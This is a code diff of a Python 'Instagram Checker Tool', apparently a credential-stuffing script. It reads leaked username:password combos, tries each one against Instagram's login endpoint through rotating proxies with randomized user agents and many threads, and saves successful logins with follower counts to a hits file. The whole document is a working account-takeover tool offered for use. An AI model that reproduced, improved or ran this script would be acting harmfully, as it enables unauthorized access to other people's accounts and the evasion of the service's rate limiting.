@@ -1,143 +1,184 @@
-import os
 import requests
 import json
-import time
-import random
-from colorama import init,Fore
 from datetime import datetime
-from multiprocessing.dummy import Pool as ThreadPool
-from threading import Thread, Lock
-import sys
+from colorama import init,Fore,Style
+from os import name,system
+from sys import stdout
+from random import choice
+from threading import Thread,Lock,active_count
+from fake_useragent import UserAgent
+from time import sleep
+from sys import stdout
 
-
-init()
-
-def clear():
-    if os.name == 'posix':
-        os.system('clear')
-    elif os.name in ('ce', 'nt', 'dos'):
-        os.system('cls')
-    else:
-        print("\n") * 120
-
-def SetTitle(title_name:str):
-    os.system("title {0}".format(title_name))
-
-def ReadFile(filename,method):
-    with open(filename,method) as f:
-        content = [line.strip('\n') for line in f]
-        return content
-
-SetTitle('One Man Builds Instagram Checker Tool')
-clear()
-retry_time = int(input('[QUESTION] Enter the ratelimit retry time: '))
-waiting_time = int(input('[QUESTION] Enter the waiting time between requests: '))
-
-def GetRandomProxy():
-    proxies_file = ReadFile('proxies.txt','r')
-    proxies = {
-        "http":"http://{0}".format(random.choice(proxies_file)),
-        "https":"https://{0}".format(random.choice(proxies_file))
-        }
-    return proxies
-
-def GetInstaFollowersNum(username):
-    response = requests.get('https://www.instagram.com/{0}/?__a=1'.format(username)).text
-    json_data = json.loads(response)
-    return json_data['graphql']['user']['edge_followed_by']['count']
-
-use_proxy = int(input('[QUESTION] Would you like to use proxies [1] yes [0] no: '))
-
-def login_instagram(combos):
-    link = 'https://www.instagram.com/accounts/login/'
-    login_url = 'https://www.instagram.com/accounts/login/ajax/'
-
-    curtime = int(datetime.now().timestamp())
-
-    get_headers = {
-        "cookie": "ig_cb=1" #if this cookie header is missing you will receive cookie errors
-    }
-
-    response = requests.get(link,headers=get_headers)
-
-    csrf = response.cookies['csrftoken']
-
-    payload = {
-        'username': combos.split('.')[0],
-        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{0}:{1}'.format(curtime,combos.split('.')[-1]),
-        'queryParams': {},
-        'optIntoOneTap': 'false'
-    }
-
-    login_header = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
-        "X-Requested-With": "XMLHttpRequest",
-        "Referer": "https://www.instagram.com/accounts/login/",
-        "x-csrftoken": csrf
-    }
-
-    login_response = ''
-
-    if waiting_time > 0:
-        PrintText('INFO','Waiting {0}s before the request.'.format(waiting_time),Fore.YELLOW,Fore.WHITE)
-        time.sleep(waiting_time)
-
-    if use_proxy == 1:
-        login_response = requests.post(login_url, data=payload, headers=login_header,proxies=GetRandomProxy())
-    else:
-        login_response = requests.post(login_url, data=payload, headers=login_header)
-
-    json_data = json.loads(login_response.text)
-
-    if 'authenticated' in json_data:
-        if json_data['authenticated'] == True:
-            followers = GetInstaFollowersNum(combos.split('.')[0])
-            PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(username,combos.split('.')[-1],followers),Fore.GREEN,Fore.WHITE)
-            with open('hits.txt','a') as f:
-                f.write('{0}:{1}\n'.format(combos.split('.')[0],combos.split('.')[-1]))
-            with open('detailed_hits.txt','a') as f:
-                f.write('{0}:{1} FOLLOWERS: {2}'.format(combos.split('.')[0],combos.split('.')[-1],followers))
-        elif json_data['status'] == 'fail':
-            if retry_time > 0:
-                PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(combos.split('.')[0],combos.split('.')[-1],json_data['message'],retry_time),Fore.RED,Fore.WHITE)
-                time.sleep(retry_time)
+class Main:
+    def clear(self):
+        if name == 'posix':
+            system('clear')
+        elif name in ('ce', 'nt', 'dos'):
+            system('cls')
         else:
-            PrintText('BAD','{0}:{1} -> failed to login'.format(combos.split('.')[0],combos.split('.')[-1]),Fore.RED,Fore.WHITE)
-            with open('bads.txt','a') as f:
-                f.write('{0}:{1}\n'.format(combos.split('.')[0],combos.split('.')[-1]))
-    elif json_data['status'] == 'fail':
-        if retry_time > 0:
-            PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(combos.split('.')[0],combos.split('.')[-1],json_data['message'],retry_time),Fore.RED,Fore.WHITE)
-            time.sleep(retry_time)
-    else:
-        PrintText('ERROR','{0}:{1} -> {2}'.format(combos.split('.')[0],combos.split('.')[-1],json_data['message']),Fore.RED,Fore.WHITE)
+            print("\n") * 120
 
-def PrintText(info_name,text,info_color:Fore,text_color:Fore):
-    lock = Lock()
-    lock.acquire()
-    sys.stdout.flush()
-    text = text.encode('ascii','replace').decode()
-    sys.stdout.write(f'[{info_color+info_name+Fore.RESET}] '+text_color+f'{text}\n')
-    lock.release()
-    
+    def SetTitle(self,title_name:str):
+        system("title {0}".format(title_name))
 
-def StartCheck(combos):
-    pool = ThreadPool()
-    results = pool.map(login_instagram,combos)
-    pool.close()
-    pool.join()
+    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
+        self.lock.acquire()
+        stdout.flush()
+        text = text.encode('ascii','replace').decode()
+        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
+        self.lock.release()
 
-if __name__ == "__main__":
-    
-    print('')
-    combos = ReadFile('combos.txt','r')
+    def ReadFile(self,filename,method):
+        with open(filename,method) as f:
+            content = [line.strip('\n') for line in f]
+            return content
 
-    StartCheck(combos)
-    #for combo in combos:
-    
-    #Parallel(n_jobs=num_cores)(delayed(Thread(target=login_instagram(combo.split(':')[0],combo.split(':')[-1],use_proxy))) for combo in combos)
-    #num_cores = multiprocessing.cpu_count()
-    #lock = Lock()
-    #lock.acquire()
-    #Thread(target=StartCheck(combos,use_proxy))
-    #lock.release()
+    def GetRandomProxy(self):
+        proxies_file = self.ReadFile('proxies.txt','r')
+        proxies = {}
+        if self.proxy_type == 1:
+            proxies = {
+                "http":"http://{0}".format(choice(proxies_file)),
+                "https":"https://{0}".format(choice(proxies_file))
+            }
+        elif self.proxy_type == 2:
+            proxies = {
+                "http":"socks4://{0}".format(choice(proxies_file)),
+                "https":"socks4://{0}".format(choice(proxies_file))
+            }
+        else:
+            proxies = {
+                "http":"socks5://{0}".format(choice(proxies_file)),
+                "https":"socks5://{0}".format(choice(proxies_file))
+            }
+        return proxies
+
+    def TitleUpdate(self):
+        while True:
+            self.SetTitle('One Man Builds Instagram Checker Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2} ^| THREADS: {3}'.format(self.hits,self.bads,self.retries,active_count()-1))
+            sleep(0.1)
+
+    def __init__(self):
+        init(convert=True)
+        self.clear()
+        self.SetTitle('One Man Builds Instagram Checker Tool')
+        self.title = Style.BRIGHT+Fore.RED+"""                                        
+                            _____ _   _  _____ _____ ___  _____ ______  ___  ___  ___
+                           |_   _| \ | |/  ___|_   _/ _ \|  __ \| ___ \/ _ \ |  \/  |
+                             | | |  \| |\ `--.  | |/ /_\ \ |  \/| |_/ / /_\ \| .  . |
+                             | | | . ` | `--. \ | ||  _  | | __ |    /|  _  || |\/| |
+                            _| |_| |\  |/\__/ / | || | | | |_\ \| |\ \| | | || |  | |
+                            \___/\_| \_/\____/  \_/\_| |_/\____/\_| \_\_| |_/\_|  |_/
+                                                                                    
+                                                                                    
+                                  _____  _   _  _____ _____  _   __ ___________            
+                                 /  __ \| | | ||  ___/  __ \| | / /|  ___| ___ \           
+                                 | /  \/| |_| || |__ | /  \/| |/ / | |__ | |_/ /           
+                                 | |    |  _  ||  __|| |    |    \ |  __||    /            
+                                 | \__/\| | | || |___| \__/\| |\  \| |___| |\ \            
+                                  \____/\_| |_/\____/ \____/\_| \_/\____/\_| \_|           
+                                                                                    
+                                                                                    
+        """
+        print(self.title)
+        self.hits = 0
+        self.bads = 0
+        self.retries = 0
+        self.ua = UserAgent()
+        self.lock = Lock()
+
+        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
+        
+        if self.use_proxy == 1:
+            self.proxy_type = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Https ['+Fore.RED+'2'+Fore.CYAN+']Socks4 ['+Fore.RED+'3'+Fore.CYAN+']Socks5: '))
+        
+        self.threads_num = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
+
+        print('')
+
+    def GetInstaFollowersNum(self,username):
+        response = requests.get('https://www.instagram.com/{0}/?__a=1'.format(username)).text
+        json_data = json.loads(response)
+        if 'graphql' in json_data:
+            return json_data['graphql']['user']['edge_followed_by']['count']
+        else:
+            return 'CANNOT GET FOLLOWERS NUM'
+
+    def InstagramCheck(self,username,password):
+        try:
+            session = requests.session()
+
+            link = 'https://www.instagram.com/accounts/login/'
+            
+            curtime = int(datetime.now().timestamp())
+
+            headers = {
+                'cookie': 'ig_cb=1'
+            }
+
+            response = session.get(link,headers=headers)
+            csrf = response.cookies['csrftoken']
+
+            auth_link = 'https://www.instagram.com/accounts/login/ajax/'
+
+            payload = {
+                'username': username,
+                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{0}:{1}'.format(curtime,password),
+                'queryParams': {},
+                'optIntoOneTap': 'false'
+            }
+
+            headers = {
+                "User-Agent": self.ua.random,
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": csrf
+            }
+
+            response = ''
+
+            if self.use_proxy == 1:
+                response = session.post(auth_link,headers=headers,data=payload,proxies=self.GetRandomProxy())
+            else:
+                response = session.post(auth_link,headers=headers,data=payload)
+
+            json_data = json.loads(response.text)
+
+            if 'authenticated' in json_data:
+                if json_data['authenticated'] == True:
+                    followers = self.GetInstaFollowersNum(username)
+                    self.PrintText(Fore.CYAN,Fore.RED,'HIT',f"{username}:{password} | FOLLOWERS: {followers}")
+                    with open('hits.txt','a',encoding='utf8') as f:
+                        f.write('{0}:{1} | FOLLOWERS: {2}\n'.format(username,password,followers))
+                    self.hits = self.hits+1
+                elif json_data['authenticated'] == False:
+                    self.PrintText(Fore.RED,Fore.CYAN,'BAD',f"{username}:{password}")
+                    with open('bads.txt','a',encoding='utf8') as f:
+                        f.write('{0}:{1}\n'.format(username,password))
+                    self.bads = self.bads+1
+                else:
+                    self.retries = self.retries+1
+                    self.InstagramCheck(username,password)
+            else:
+                self.retries = self.retries+1
+                self.InstagramCheck(username,password)
+        except Exception as e:
+            self.retries = self.retries+1
+            self.InstagramCheck(username,password)
+
+    def Start(self):
+        Thread(target=self.TitleUpdate).start()
+        combos = self.ReadFile('combos.txt','r')
+        for combo in combos:
+            Run = True
+            username = combo.split(':')[0]
+            password = combo.split(':')[-1]
+
+            if active_count()<=self.threads_num:
+                Thread(target=self.InstagramCheck,args=(username,password)).start()
+                Run = False
+
+if __name__ == '__main__':
+    main = Main()
+    main.Start()
